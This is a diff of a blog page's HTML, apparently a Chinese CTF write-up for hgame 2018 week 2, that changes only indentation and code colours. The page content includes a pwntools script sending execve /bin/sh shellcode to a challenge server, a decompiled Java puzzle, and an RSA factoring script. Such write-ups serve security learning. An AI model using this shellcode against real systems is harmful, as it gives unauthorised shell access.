@@ -43,10 +43,10 @@ renderMathInElement(document.body, katex_config);
       
 
       
-        <link rel="alternate" type="application/rss+xml" title="RSS" href="https://CSUwangj.github.io/rss.xml">
+      <link rel="alternate" type="application/rss+xml" title="RSS" href="https://CSUwangj.github.io/rss.xml">
       
       
-        <link rel="icon" type="image/x-icon" href="https://CSUwangj.github.io/images/favicon.ico">
+      <link rel="icon" type="image/x-icon" href="https://CSUwangj.github.io/images/favicon.ico">
       
 
       
@@ -56,43 +56,43 @@ renderMathInElement(document.body, katex_config);
     <body>
       
       
-        <header name="header">
-          <div>
-            <div class="logo"><a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;">LuckyDog</a></div>
-            <nav class="menu">
-              
-                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;" class="nav-item-home unselectable">
-                  <span><i class="fa-solid fa-house"></i> Home</span>
-                </a>
-              
-                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;about" class="nav-item-about unselectable">
-                  <span><i class="fa-solid fa-user-circle"></i> About</span>
-                </a>
-              
-                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;categories" class="nav-item-categories unselectable">
-                  <span><i class="fa-solid fa-book"></i> Categories</span>
-                </a>
-              
-                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;tags" class="nav-item-tags unselectable">
-                  <span><i class="fa-solid fa-tags"></i> Tags</span>
-                </a>
-              
-                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;archives" class="nav-item-archives unselectable">
-                  <span><i class="fa-solid fa-inbox"></i> Archives</span>
-                </a>
-              
-                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;ZDaily" class="nav-item-dailychallenge unselectable">
-                  <span><i class="fa-solid fa-calendar-check"></i> DailyChallenge</span>
-                </a>
-              
-                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;Webtools" class="nav-item-webtools unselectable">
-                  <span><i class="fa-solid fa-toolbox"></i> Webtools</span>
-                </a>
-              
-              
-            </nav>
-          </div>
-        </header>
+      <header name="header">
+        <div>
+          <div class="logo"><a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;">LuckyDog</a></div>
+          <nav class="menu">
+            
+            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;" class="nav-item-home unselectable">
+              <span><i class="fa-solid fa-house"></i> Home</span>
+            </a>
+            
+            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;about" class="nav-item-about unselectable">
+              <span><i class="fa-solid fa-user-circle"></i> About</span>
+            </a>
+            
+            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;categories" class="nav-item-categories unselectable">
+              <span><i class="fa-solid fa-book"></i> Categories</span>
+            </a>
+            
+            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;tags" class="nav-item-tags unselectable">
+              <span><i class="fa-solid fa-tags"></i> Tags</span>
+            </a>
+            
+            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;archives" class="nav-item-archives unselectable">
+              <span><i class="fa-solid fa-inbox"></i> Archives</span>
+            </a>
+            
+            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;ZDaily" class="nav-item-dailychallenge unselectable">
+              <span><i class="fa-solid fa-calendar-check"></i> DailyChallenge</span>
+            </a>
+            
+            <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;Webtools" class="nav-item-webtools unselectable">
+              <span><i class="fa-solid fa-toolbox"></i> Webtools</span>
+            </a>
+            
+            
+          </nav>
+        </div>
+      </header>
       
 
       <main class="content container" name="main">
@@ -210,12 +210,12 @@ violence</li>
 <h1 id="pwn">PWN</h1>
 <h2 id="ez-shellcode">ez_shellcode</h2>
 <p>既然是直接执行，那找一个就好了</p>
-<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
-</span><span>r = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">111.230.149.72</span><span>&quot;,</span><span style="color:#d08770;">10004</span><span>)
-</span><span style="color:#b48ead;">print </span><span>r.recv
-</span><span>payload = &quot;</span><span style="color:#96b5b4;">\x6a\x0b</span><span>&quot;+&quot;</span><span style="color:#96b5b4;">\x58</span><span>&quot;+&quot;</span><span style="color:#96b5b4;">\x99</span><span>&quot;+&quot;</span><span style="color:#96b5b4;">\x52</span><span>&quot;+&quot;</span><span style="color:#96b5b4;">\x68\x2f\x2f\x73\x68</span><span>&quot;+&quot;</span><span style="color:#96b5b4;">\x68\x2f\x62\x69\x6e</span><span>&quot;+&quot;</span><span style="color:#96b5b4;">\x89\xe3</span><span>&quot;+&quot;</span><span style="color:#96b5b4;">\x52</span><span>&quot; +&quot;</span><span style="color:#96b5b4;">\x53</span><span>&quot;+&quot;</span><span style="color:#96b5b4;">\x89\xe1</span><span>&quot;+&quot;</span><span style="color:#96b5b4;">\xcd\x80</span><span>&quot;
-</span><span>r.</span><span style="color:#bf616a;">send</span><span>(payload)
-</span><span>r.</span><span style="color:#bf616a;">interactive</span><span>()
+<pre data-lang="python" style="background-color:#14191f;color:#aec2e0;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#748aa6;">from </span><span>pwn </span><span style="color:#748aa6;">import </span><span style="color:#6ee2ff;">*
+</span><span>r </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">remote</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">111.230.149.72</span><span style="color:#516a88;">&quot;</span><span>,</span><span style="color:#6ee2ff;">10004</span><span>)
+</span><span style="color:#748aa6;">print </span><span>r.recv
+</span><span>payload </span><span style="color:#748aa6;">= </span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x6a\x0b</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x58</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x99</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x52</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x68\x2f\x2f\x73\x68</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x68\x2f\x62\x69\x6e</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x89\xe3</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x52</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x53</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x89\xe1</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\xcd\x80</span><span style="color:#516a88;">&quot;
+</span><span>r.</span><span style="color:#d0dfe6;">send</span><span>(payload)
+</span><span>r.</span><span style="color:#d0dfe6;">interactive</span><span>()
 </span></code></pre>
 <h2 id="ez-bash-jail">ez bash jail</h2>
 <p>根据视频教程</p>
@@ -239,60 +239,60 @@ violence</li>
 <p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_222543.png" alt="mysterious file header1" /></p>
 <p>解压出来的文件拿反编译器http://www.javadecompilers.com/搞一下</p>
 <p>有用的代码为</p>
-<pre data-lang="java" style="background-color:#2b303b;color:#c0c5ce;" class="language-java "><code class="language-java" data-lang="java"><span style="color:#65737e;">/*
-</span><span style="color:#65737e;"> * Decompiled with CFR 0_123.
-</span><span style="color:#65737e;"> */
-</span><span style="color:#b48ead;">package </span><span>GUI;
+<pre data-lang="java" style="background-color:#14191f;color:#aec2e0;" class="language-java "><code class="language-java" data-lang="java"><span style="color:#516a88;">/*
+</span><span style="color:#516a88;"> * Decompiled with CFR 0_123.
+</span><span style="color:#516a88;"> */
+</span><span style="color:#748aa6;">package </span><span>GUI;
 </span><span>
-</span><span style="color:#b48ead;">import </span><span>java.awt.</span><span style="color:#ebcb8b;">Component</span><span>;
-</span><span style="color:#b48ead;">import </span><span>java.awt.</span><span style="color:#ebcb8b;">GridLayout</span><span>;
-</span><span style="color:#b48ead;">import </span><span>java.awt.</span><span style="color:#ebcb8b;">LayoutManager</span><span>;
-</span><span style="color:#b48ead;">import </span><span>java.awt.event.</span><span style="color:#ebcb8b;">ActionEvent</span><span>;
-</span><span style="color:#b48ead;">import </span><span>java.awt.event.</span><span style="color:#ebcb8b;">ActionListener</span><span>;
-</span><span style="color:#b48ead;">import </span><span>javax.swing.</span><span style="color:#ebcb8b;">JButton</span><span>;
-</span><span style="color:#b48ead;">import </span><span>javax.swing.</span><span style="color:#ebcb8b;">JFrame</span><span>;
-</span><span style="color:#b48ead;">import </span><span>javax.swing.</span><span style="color:#ebcb8b;">JPanel</span><span>;
-</span><span style="color:#b48ead;">import </span><span>javax.swing.</span><span style="color:#ebcb8b;">JTextArea</span><span>;
+</span><span style="color:#748aa6;">import </span><span style="font-style:italic;color:#267fb5;">java</span><span>.</span><span style="font-style:italic;color:#267fb5;">awt</span><span>.</span><span style="font-style:italic;color:#267fb5;">Component</span><span>;
+</span><span style="color:#748aa6;">import </span><span style="font-style:italic;color:#267fb5;">java</span><span>.</span><span style="font-style:italic;color:#267fb5;">awt</span><span>.</span><span style="font-style:italic;color:#267fb5;">GridLayout</span><span>;
+</span><span style="color:#748aa6;">import </span><span style="font-style:italic;color:#267fb5;">java</span><span>.</span><span style="font-style:italic;color:#267fb5;">awt</span><span>.</span><span style="font-style:italic;color:#267fb5;">LayoutManager</span><span>;
+</span><span style="color:#748aa6;">import </span><span style="font-style:italic;color:#267fb5;">java</span><span>.</span><span style="font-style:italic;color:#267fb5;">awt</span><span>.</span><span style="font-style:italic;color:#267fb5;">event</span><span>.</span><span style="font-style:italic;color:#267fb5;">ActionEvent</span><span>;
+</span><span style="color:#748aa6;">import </span><span style="font-style:italic;color:#267fb5;">java</span><span>.</span><span style="font-style:italic;color:#267fb5;">awt</span><span>.</span><span style="font-style:italic;color:#267fb5;">event</span><span>.</span><span style="font-style:italic;color:#267fb5;">ActionListener</span><span>;
+</span><span style="color:#748aa6;">import </span><span style="font-style:italic;color:#267fb5;">javax</span><span>.</span><span style="font-style:italic;color:#267fb5;">swing</span><span>.</span><span style="font-style:italic;color:#267fb5;">JButton</span><span>;
+</span><span style="color:#748aa6;">import </span><span style="font-style:italic;color:#267fb5;">javax</span><span>.</span><span style="font-style:italic;color:#267fb5;">swing</span><span>.</span><span style="font-style:italic;color:#267fb5;">JFrame</span><span>;
+</span><span style="color:#748aa6;">import </span><span style="font-style:italic;color:#267fb5;">javax</span><span>.</span><span style="font-style:italic;color:#267fb5;">swing</span><span>.</span><span style="font-style:italic;color:#267fb5;">JPanel</span><span>;
+</span><span style="color:#748aa6;">import </span><span style="font-style:italic;color:#267fb5;">javax</span><span>.</span><span style="font-style:italic;color:#267fb5;">swing</span><span>.</span><span style="font-style:italic;color:#267fb5;">JTextArea</span><span>;
 </span><span>
-</span><span style="color:#b48ead;">public class </span><span style="color:#ebcb8b;">hgameGUI
-</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">extends </span><span style="color:#a3be8c;">JFrame </span><span style="color:#eff1f5;">{
-</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private static final int </span><span style="color:#eff1f5;">DEFAULT_WIDTH </span><span>= </span><span style="color:#d08770;">300</span><span style="color:#eff1f5;">;
-</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private static final int </span><span style="color:#eff1f5;">DEFAULT_HEIGHT </span><span>= </span><span style="color:#d08770;">200</span><span style="color:#eff1f5;">;
-</span><span style="color:#eff1f5;">
-</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">public </span><span style="color:#8fa1b3;">hgameGUI</span><span style="color:#eff1f5;">() {
-</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">super</span><span style="color:#eff1f5;">(</span><span>&quot;</span><span style="color:#a3be8c;">Welcome to Hgame!</span><span>&quot;</span><span style="color:#eff1f5;">);
-</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">setSize</span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">300</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">200</span><span style="color:#eff1f5;">);
-</span><span style="color:#eff1f5;">        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag1 </span><span>= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span>&quot;</span><span style="color:#a3be8c;">i&#39;m flag</span><span>&quot;</span><span style="color:#eff1f5;">);
-</span><span style="color:#eff1f5;">        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag2 </span><span>= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span>&quot;</span><span style="color:#a3be8c;">i&#39;m flag, too.</span><span>&quot;</span><span style="color:#eff1f5;">);
-</span><span style="color:#eff1f5;">        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag3 </span><span>= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span>&quot;</span><span style="color:#a3be8c;">RU kidding me? I&#39;m the true flag!</span><span>&quot;</span><span style="color:#eff1f5;">);
-</span><span style="color:#eff1f5;">        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag4 </span><span>= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span>&quot;</span><span style="color:#a3be8c;">UR wrong, I&#39;m the true flag!</span><span>&quot;</span><span style="color:#eff1f5;">);
-</span><span style="color:#eff1f5;">        </span><span style="color:#ebcb8b;">JTextArea</span><span style="color:#eff1f5;"> flagtext </span><span>= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JTextArea</span><span style="color:#eff1f5;">(</span><span>&quot;</span><span style="color:#a3be8c;">Want flag? Try upstairs.</span><span>&quot;</span><span style="color:#eff1f5;">);
-</span><span style="color:#eff1f5;">        </span><span style="color:#ebcb8b;">JPanel</span><span style="color:#eff1f5;"> flag </span><span>= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JPanel</span><span style="color:#eff1f5;">();
-</span><span style="color:#eff1f5;">        flag.</span><span style="color:#bf616a;">setLayout</span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">GridLayout</span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">5</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">1</span><span style="color:#eff1f5;">));
-</span><span style="color:#eff1f5;">        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag1);
-</span><span style="color:#eff1f5;">        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag2);
-</span><span style="color:#eff1f5;">        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag3);
-</span><span style="color:#eff1f5;">        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag4);
-</span><span style="color:#eff1f5;">        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flagtext);
-</span><span style="color:#eff1f5;">        flag1.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{
-</span><span style="color:#eff1f5;">                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span>&quot;</span><span style="color:#a3be8c;">118</span><span>&quot;</span><span style="color:#eff1f5;">);
-</span><span style="color:#eff1f5;">                }
-</span><span style="color:#eff1f5;">        );
-</span><span style="color:#eff1f5;">        flag2.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{
-</span><span style="color:#eff1f5;">                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span>&quot;</span><span style="color:#a3be8c;">54</span><span>&quot;</span><span style="color:#eff1f5;">);
-</span><span style="color:#eff1f5;">                }
-</span><span style="color:#eff1f5;">        );
-</span><span style="color:#eff1f5;">        flag3.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{
-</span><span style="color:#eff1f5;">                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span>&quot;</span><span style="color:#a3be8c;">29</span><span>&quot;</span><span style="color:#eff1f5;">);
-</span><span style="color:#eff1f5;">                }
-</span><span style="color:#eff1f5;">        );
-</span><span style="color:#eff1f5;">        flag4.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{
-</span><span style="color:#eff1f5;">                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span>&quot;</span><span style="color:#a3be8c;">89</span><span>&quot;</span><span style="color:#eff1f5;">);
-</span><span style="color:#eff1f5;">                }
-</span><span style="color:#eff1f5;">        );
-</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag);
-</span><span style="color:#eff1f5;">    }
-</span><span style="color:#eff1f5;">}
+</span><span style="color:#ffffff;">public </span><span style="font-style:italic;color:#267fb5;">class </span><span style="text-decoration:underline;color:#95cc5e;">hgameGUI
+</span><span>        </span><span style="color:#748aa6;">extends </span><span style="text-decoration:underline;font-style:italic;color:#95cc5e;">JFrame </span><span>{
+</span><span>    </span><span style="color:#ffffff;">private static final </span><span style="font-style:italic;color:#267fb5;">int </span><span>DEFAULT_WIDTH </span><span style="color:#748aa6;">= </span><span style="color:#6ee2ff;">300</span><span>;
+</span><span>    </span><span style="color:#ffffff;">private static final </span><span style="font-style:italic;color:#267fb5;">int </span><span>DEFAULT_HEIGHT </span><span style="color:#748aa6;">= </span><span style="color:#6ee2ff;">200</span><span>;
+</span><span>
+</span><span>    </span><span style="color:#ffffff;">public </span><span style="color:#effbff;">hgameGUI</span><span>() {
+</span><span>        </span><span style="color:#d0dfe6;">super</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">Welcome to Hgame!</span><span style="color:#516a88;">&quot;</span><span>);
+</span><span>        </span><span style="color:#d0dfe6;">this</span><span>.</span><span style="color:#d0dfe6;">setSize</span><span>(</span><span style="color:#6ee2ff;">300</span><span>, </span><span style="color:#6ee2ff;">200</span><span>);
+</span><span>        </span><span style="font-style:italic;color:#267fb5;">JButton</span><span> flag1 </span><span style="color:#748aa6;">= new </span><span style="font-style:italic;color:#267fb5;">JButton</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">i&#39;m flag</span><span style="color:#516a88;">&quot;</span><span>);
+</span><span>        </span><span style="font-style:italic;color:#267fb5;">JButton</span><span> flag2 </span><span style="color:#748aa6;">= new </span><span style="font-style:italic;color:#267fb5;">JButton</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">i&#39;m flag, too.</span><span style="color:#516a88;">&quot;</span><span>);
+</span><span>        </span><span style="font-style:italic;color:#267fb5;">JButton</span><span> flag3 </span><span style="color:#748aa6;">= new </span><span style="font-style:italic;color:#267fb5;">JButton</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">RU kidding me? I&#39;m the true flag!</span><span style="color:#516a88;">&quot;</span><span>);
+</span><span>        </span><span style="font-style:italic;color:#267fb5;">JButton</span><span> flag4 </span><span style="color:#748aa6;">= new </span><span style="font-style:italic;color:#267fb5;">JButton</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">UR wrong, I&#39;m the true flag!</span><span style="color:#516a88;">&quot;</span><span>);
+</span><span>        </span><span style="font-style:italic;color:#267fb5;">JTextArea</span><span> flagtext </span><span style="color:#748aa6;">= new </span><span style="font-style:italic;color:#267fb5;">JTextArea</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">Want flag? Try upstairs.</span><span style="color:#516a88;">&quot;</span><span>);
+</span><span>        </span><span style="font-style:italic;color:#267fb5;">JPanel</span><span> flag </span><span style="color:#748aa6;">= new </span><span style="font-style:italic;color:#267fb5;">JPanel</span><span>();
+</span><span>        flag.</span><span style="color:#d0dfe6;">setLayout</span><span>(</span><span style="color:#748aa6;">new </span><span style="font-style:italic;color:#267fb5;">GridLayout</span><span>(</span><span style="color:#6ee2ff;">5</span><span>, </span><span style="color:#6ee2ff;">1</span><span>));
+</span><span>        flag.</span><span style="color:#d0dfe6;">add</span><span>(flag1);
+</span><span>        flag.</span><span style="color:#d0dfe6;">add</span><span>(flag2);
+</span><span>        flag.</span><span style="color:#d0dfe6;">add</span><span>(flag3);
+</span><span>        flag.</span><span style="color:#d0dfe6;">add</span><span>(flag4);
+</span><span>        flag.</span><span style="color:#d0dfe6;">add</span><span>(flagtext);
+</span><span>        flag1.</span><span style="color:#d0dfe6;">addActionListener</span><span>(</span><span style="font-style:italic;color:#95cc5e;">event </span><span style="font-style:italic;color:#267fb5;">-&gt; </span><span>{
+</span><span>                    flagtext.</span><span style="color:#d0dfe6;">setText</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">118</span><span style="color:#516a88;">&quot;</span><span>);
+</span><span>                }
+</span><span>        );
+</span><span>        flag2.</span><span style="color:#d0dfe6;">addActionListener</span><span>(</span><span style="font-style:italic;color:#95cc5e;">event </span><span style="font-style:italic;color:#267fb5;">-&gt; </span><span>{
+</span><span>                    flagtext.</span><span style="color:#d0dfe6;">setText</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">54</span><span style="color:#516a88;">&quot;</span><span>);
+</span><span>                }
+</span><span>        );
+</span><span>        flag3.</span><span style="color:#d0dfe6;">addActionListener</span><span>(</span><span style="font-style:italic;color:#95cc5e;">event </span><span style="font-style:italic;color:#267fb5;">-&gt; </span><span>{
+</span><span>                    flagtext.</span><span style="color:#d0dfe6;">setText</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">29</span><span style="color:#516a88;">&quot;</span><span>);
+</span><span>                }
+</span><span>        );
+</span><span>        flag4.</span><span style="color:#d0dfe6;">addActionListener</span><span>(</span><span style="font-style:italic;color:#95cc5e;">event </span><span style="font-style:italic;color:#267fb5;">-&gt; </span><span>{
+</span><span>                    flagtext.</span><span style="color:#d0dfe6;">setText</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">89</span><span style="color:#516a88;">&quot;</span><span>);
+</span><span>                }
+</span><span>        );
+</span><span>        </span><span style="color:#d0dfe6;">this</span><span>.</span><span style="color:#d0dfe6;">add</span><span>(flag);
+</span><span>    }
+</span><span>}
 </span></code></pre>
 <p>智障的我反应了半天才明白这是IP地址</p>
 <p>遍历一下顺序查一下，在中国的一个IP里找到</p>
@@ -301,43 +301,43 @@ violence</li>
 <h1 id="crypto">Crypto</h1>
 <h2 id="easy-rsa">easy rsa</h2>
 <p>明明还是偶尔摸摸ACM的，二分都想不起来……MDZZ</p>
-<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>N = </span><span style="color:#d08770;">10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001
-</span><span>e = </span><span style="color:#d08770;">65537
-</span><span>c = </span><span style="color:#d08770;">4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891
-</span><span>h = </span><span style="color:#d08770;">211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750
+<pre data-lang="python" style="background-color:#14191f;color:#aec2e0;" class="language-python "><code class="language-python" data-lang="python"><span>N </span><span style="color:#748aa6;">= </span><span style="color:#6ee2ff;">10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001
+</span><span>e </span><span style="color:#748aa6;">= </span><span style="color:#6ee2ff;">65537
+</span><span>c </span><span style="color:#748aa6;">= </span><span style="color:#6ee2ff;">4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891
+</span><span>h </span><span style="color:#748aa6;">= </span><span style="color:#6ee2ff;">211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750
 </span><span>
-</span><span>low = </span><span style="color:#d08770;">1
-</span><span>high = h//</span><span style="color:#d08770;">2 
-</span><span>mid =</span><span style="color:#bf616a;">int</span><span>((low+high))//</span><span style="color:#d08770;">2
+</span><span>low </span><span style="color:#748aa6;">= </span><span style="color:#6ee2ff;">1
+</span><span>high </span><span style="color:#748aa6;">= </span><span>h</span><span style="color:#748aa6;">//</span><span style="color:#6ee2ff;">2 
+</span><span>mid </span><span style="color:#748aa6;">=</span><span style="font-style:italic;color:#267fb5;">int</span><span>((low</span><span style="color:#748aa6;">+</span><span>high))</span><span style="color:#748aa6;">//</span><span style="color:#6ee2ff;">2
 </span><span>
-</span><span style="color:#b48ead;">while </span><span>low&lt;high:
-</span><span>	</span><span style="color:#b48ead;">if </span><span>low*(h-low)  &gt; N:
-</span><span>		high = mid-</span><span style="color:#d08770;">1
-</span><span>	</span><span style="color:#b48ead;">else</span><span>:
-</span><span>		low = mid + </span><span style="color:#d08770;">1
-</span><span>	mid = (low+high)//</span><span style="color:#d08770;">2
+</span><span style="color:#748aa6;">while </span><span>low</span><span style="color:#748aa6;">&lt;</span><span>high:
+</span><span>	</span><span style="color:#748aa6;">if </span><span>low</span><span style="color:#748aa6;">*</span><span>(h</span><span style="color:#748aa6;">-</span><span>low)  </span><span style="color:#748aa6;">&gt; </span><span>N:
+</span><span>		high </span><span style="color:#748aa6;">= </span><span>mid</span><span style="color:#748aa6;">-</span><span style="color:#6ee2ff;">1
+</span><span>	</span><span style="color:#748aa6;">else</span><span>:
+</span><span>		low </span><span style="color:#748aa6;">= </span><span>mid </span><span style="color:#748aa6;">+ </span><span style="color:#6ee2ff;">1
+</span><span>	mid </span><span style="color:#748aa6;">= </span><span>(low</span><span style="color:#748aa6;">+</span><span>high)</span><span style="color:#748aa6;">//</span><span style="color:#6ee2ff;">2
 </span><span>
-</span><span style="color:#96b5b4;">print</span><span>(low)
-</span><span style="color:#96b5b4;">print</span><span>(h-low)
+</span><span style="color:#267fb5;">print</span><span>(low)
+</span><span style="color:#267fb5;">print</span><span>(h</span><span style="color:#748aa6;">-</span><span>low)
 </span></code></pre>
 <p>这样就有p/q了</p>
 <p>后来发现这出题人一开始应该没这样想</p>
 <p>回头补……</p>
 <h2 id="the-same-simple-rsa">The same simple RSA</h2>
 <p>先读一下key咯</p>
-<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">$</span><span> openssl rsa</span><span style="color:#bf616a;"> -pubin -in</span><span> pubkey.pem</span><span style="color:#bf616a;"> -text -modulus
-</span><span style="color:#bf616a;">Public-Key:</span><span> (256 bit)
-</span><span style="color:#bf616a;">Modulus:
